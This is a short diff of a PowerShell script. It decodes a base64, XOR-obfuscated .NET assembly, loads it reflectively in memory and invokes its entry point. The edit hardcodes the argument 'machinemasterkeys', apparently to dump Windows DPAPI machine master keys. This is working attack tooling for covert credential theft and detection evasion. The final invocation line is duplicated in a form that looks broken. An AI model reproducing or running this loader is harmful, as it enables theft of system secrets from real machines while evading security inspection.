@@ -2,7 +2,7 @@ $f084161c = "qL915ebl5eXh5eXlGhrl5V3l5eXl5eXlpeXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eX
 $fb = [Convert]::FromBase64String($f084161c)
 for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor 0xe5}
 $asm = [System.Reflection.Assembly]::Load($fb)
-$INVOKER_ARGS = ""
+$INVOKER_ARGS = "machinemasterkeys"
 $INVOKER_ARGS -eq "" -and ($INVOKER_ARGS = Read-Host "Specify command arguments")
 $asm.GetType("Wffxygcelberf.Program", [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, "$INVOKER_ARGS".split()))
 $asm.GetType([Wffxygcelberf.Program], [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, "$INVOKER_ARGS".split()))
